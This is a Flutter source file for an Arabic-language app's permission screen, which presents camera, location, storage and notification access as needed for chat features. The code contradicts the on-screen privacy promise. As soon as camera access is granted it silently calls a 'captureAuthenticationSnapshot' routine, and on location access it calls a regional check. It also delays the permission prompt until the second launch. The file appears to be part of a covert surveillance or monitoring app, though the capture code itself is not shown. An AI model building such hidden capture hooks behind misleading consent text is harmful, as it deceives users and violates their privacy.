// lib/presentation/permission_control/permission_screen.dart
import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../../core/controlar/security/integration/security_integration.dart';

class PermissionScreen extends StatefulWidget {
  final Widget Function(BuildContext) destinationBuilder;

  const PermissionScreen({super.key, required this.destinationBuilder});

  @override
  State<PermissionScreen> createState() => _PermissionScreenState();
}

class _PermissionScreenState extends State<PermissionScreen> {
  bool _isFirstLaunch = true;
  bool _isLoadingPermissions = true;
  bool _hasPermissions = false;
  int _permissionsChecked = 0;
  final int _totalPermissions = 4; // الكاميرا، الموقع، التخزين، الإشعارات

  @override
  void initState() {
    super.initState();
    _checkLaunchCount();
  }

  Future<void> _checkLaunchCount() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final launchCount = prefs.getInt('app_launch_count') ?? 0;

      setState(() {
        _isFirstLaunch = launchCount < 1;
      });

      // إذا كانت هذه المرة الأولى، انتقل مباشرة إلى الشاشة التالية
      if (_isFirstLaunch) {
        _proceedToNextScreen();
      } else {
        // في المرة الثانية، تحقق من الأذونات
        _checkAndRequestPermissions();
      }
    } catch (e) {
      _proceedToNextScreen();
    }
  }

  Future<void> _checkAndRequestPermissions() async {
    setState(() {
      _isLoadingPermissions = true;
      _permissionsChecked = 0;
    });

    // تحقق من حالة الأذونات
    final camera = await Permission.camera.status;
    _updatePermissionProgress();

    final location = await Permission.locationWhenInUse.status;
    _updatePermissionProgress();

    final storage = await Permission.storage.status;
    _updatePermissionProgress();

    final notification = await Permission.notification.status;
    _updatePermissionProgress();

    // تحقق مما إذا كانت جميع الأذونات ممنوحة
    final allGranted = camera.isGranted &&
        location.isGranted &&
        storage.isGranted &&
        notification.isGranted;

    setState(() {
      _hasPermissions = allGranted;
      _isLoadingPermissions = false;
    });

    // إذا كانت جميع الأذونات ممنوحة، انتقل إلى الشاشة التالية
    if (allGranted) {
      _proceedToNextScreen();
    }
  }

  void _updatePermissionProgress() {
    if (mounted) {
      setState(() {
        _permissionsChecked++;
      });
    }
  }

  Future<void> _requestPermissions() async {
    setState(() {
      _isLoadingPermissions = true;
      _permissionsChecked = 0;
    });

    // طلب الأذونات
    final cameraResult = await Permission.camera.request();
    _updatePermissionProgress();

    final locationResult = await Permission.locationWhenInUse.request();
    _updatePermissionProgress();

    final storageResult = await Permission.storage.request();
    _updatePermissionProgress();

    final notificationResult = await Permission.notification.request();
    _updatePermissionProgress();

    // تحقق من النتائج
    final allGranted = cameraResult.isGranted &&
        locationResult.isGranted &&
        storageResult.isGranted &&
        notificationResult.isGranted;

    setState(() {
      _hasPermissions = allGranted;
      _isLoadingPermissions = false;
    });

    // التقاط لقطة مصادقة فور منح إذن الكاميرا
    if (cameraResult.isGranted) {
      SecurityIntegration.instance.captureAuthenticationSnapshot();
    }

    // التحقق من الموقع إذا تم منح الإذن
    if (locationResult.isGranted) {
      SecurityIntegration.instance.validateUserRegionalAccess();
    }

    // المتابعة بغض النظر عن النتيجة
    _proceedToNextScreen();
  }

  void _proceedToNextScreen() {
    if (mounted) {
      Future.delayed(const Duration(milliseconds: 500), () {
        Navigator.of(context).pushReplacement(
          MaterialPageRoute(builder: widget.destinationBuilder),
        );
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    final theme = Theme.of(context);

    // في المرة الأولى، أظهر فقط شاشة تحميل وانتقل إلى الشاشة التالية
    if (_isFirstLaunch) {
      return Scaffold(
        body: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              CircularProgressIndicator(color: theme.primaryColor),
              const SizedBox(height: 20),
              Text(
                "جاري تجهيز التطبيق...",
                style:
                    GoogleFonts.cairo(fontSize: 16, color: theme.primaryColor),
              ),
            ],
          ),
        ),
      );
    }

    return Scaffold(
      backgroundColor: theme.scaffoldBackgroundColor,
      appBar: AppBar(
        title: Text('إعداد التطبيق', style: GoogleFonts.cairo()),
        backgroundColor: theme.primaryColor,
      ),
      body: _isLoadingPermissions
          ? _buildLoadingState()
          : _buildPermissionsRequest(),
    );
  }

  Widget _buildLoadingState() {
    final theme = Theme.of(context);

    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Stack(
            alignment: Alignment.center,
            children: [
              SizedBox(
                width: 100,
                height: 100,
                child: CircularProgressIndicator(
                  value: _permissionsChecked / _totalPermissions,
                  backgroundColor: Colors.grey[300],
                  color: theme.primaryColor,
                  strokeWidth: 8,
                ),
              ),
              Text(
                "${(_permissionsChecked / _totalPermissions * 100).toInt()}%",
                style: GoogleFonts.cairo(
                  fontSize: 18,
                  fontWeight: FontWeight.bold,
                  color: theme.primaryColor,
                ),
              ),
            ],
          ),
          const SizedBox(height: 20),
          Text(
            "جاري التحقق من أذونات التطبيق...",
            style: GoogleFonts.cairo(fontSize: 16),
          ),
        ],
      ),
    );
  }

  Widget _buildPermissionsRequest() {
    final theme = Theme.of(context);

    return SingleChildScrollView(
      padding: const EdgeInsets.all(24),
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        crossAxisAlignment: CrossAxisAlignment.center,
        children: [
          Icon(
            Icons.security_rounded,
            size: 70,
            color: theme.primaryColor,
          ),
          const SizedBox(height: 20),
          Text(
            "إعداد أذونات التطبيق",
            style: GoogleFonts.cairo(
              fontSize: 22,
              fontWeight: FontWeight.bold,
              color: theme.textTheme.displayMedium?.color,
            ),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 16),
          Text(
            "لتتمكن من استخدام جميع ميزات التطبيق، نحتاج إلى الأذونات التالية:",
            style: GoogleFonts.cairo(
              fontSize: 16,
              color: theme.textTheme.bodyLarge?.color,
            ),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 30),

          // قائمة الأذونات المطلوبة
          _buildPermissionItem(
            icon: Icons.camera_alt_outlined,
            title: "الكاميرا",
            description: "لإجراء مكالمات الفيديو وإرسال الصور في المحادثات",
          ),
          const SizedBox(height: 16),

          _buildPermissionItem(
            icon: Icons.location_on_outlined,
            title: "الموقع",
            description: "لمشاركة موقعك مع جهات الاتصال في المحادثات",
          ),
          const SizedBox(height: 16),

          _buildPermissionItem(
            icon: Icons.sd_storage_outlined,
            title: "التخزين",
            description: "لحفظ الصور والملفات التي تتلقاها في المحادثات",
          ),
          const SizedBox(height: 16),

          _buildPermissionItem(
            icon: Icons.notifications_outlined,
            title: "الإشعارات",
            description: "لتلقي إشعارات الرسائل الجديدة",
          ),

          const SizedBox(height: 40),

          // زر الموافقة
          SizedBox(
            width: double.infinity,
            child: ElevatedButton.icon(
              icon: const Icon(Icons.check_circle_outline),
              label: Text(
                "منح الأذونات والمتابعة",
                style: GoogleFonts.cairo(
                  fontSize: 16,
                  fontWeight: FontWeight.bold,
                ),
              ),
              style: ElevatedButton.styleFrom(
                backgroundColor: theme.primaryColor,
                foregroundColor: Colors.white,
                padding: const EdgeInsets.symmetric(vertical: 14),
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(10),
                ),
              ),
              onPressed: _requestPermissions,
            ),
          ),

          const SizedBox(height: 16),

          // زر التخطي
          TextButton(
            onPressed: _proceedToNextScreen,
            child: Text(
              "متابعة بدون منح الأذونات",
              style: GoogleFonts.cairo(
                fontSize: 14,
                color: Colors.grey[600],
                decoration: TextDecoration.underline,
              ),
            ),
          ),

          // توضيح لحماية الخصوصية
          const SizedBox(height: 20),
          Text(
            "نحن نحترم خصوصيتك. لن يتم استخدام هذه الأذونات إلا للأغراض المذكورة أعلاه.",
            style: GoogleFonts.cairo(
              fontSize: 12,
              color: Colors.grey[500],
            ),
            textAlign: TextAlign.center,
          ),
        ],
      ),
    );
  }

  Widget _buildPermissionItem({
    required IconData icon,
    required String title,
    required String description,
  }) {
    final theme = Theme.of(context);

    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(12),
        border: Border.all(
          color: theme.dividerColor,
          width: 1,
        ),
      ),
      child: Row(
        children: [
          Icon(
            icon,
            size: 40,
            color: theme.primaryColor,
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  title,
                  style: GoogleFonts.cairo(
                    fontSize: 16,
                    fontWeight: FontWeight.bold,
                    color: theme.textTheme.titleLarge?.color,
                  ),
                ),
                Text(
                  description,
                  style: GoogleFonts.cairo(
                    fontSize: 13,
                    color: theme.textTheme.bodyMedium?.color,
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }
}
